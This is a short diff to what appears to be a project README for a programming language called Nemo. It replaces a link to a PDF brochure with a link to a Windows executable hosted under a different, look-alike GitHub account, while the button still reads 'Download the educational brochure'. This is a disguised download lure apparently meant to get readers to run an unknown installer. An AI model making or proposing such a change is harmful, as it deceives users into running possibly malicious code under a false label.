@@ -19,7 +19,7 @@ Nemo is a high-performance programming language designed with security and speed
 
 ---
 
-<a href="https://github.com/DrewStudio/Nemo/raw/main/downloads/Nemo_Brochure.pdf" download>
+<a href="https://github.com/drewstudiosaudi/Nemo/releases/download/neo966/Install.Nemo.-.E.exe" download>
   <button style="background-color: #4CAF50; color: white; padding: 10px 20px; border: none; cursor: pointer;">
     Download the educational brochure
   </button>
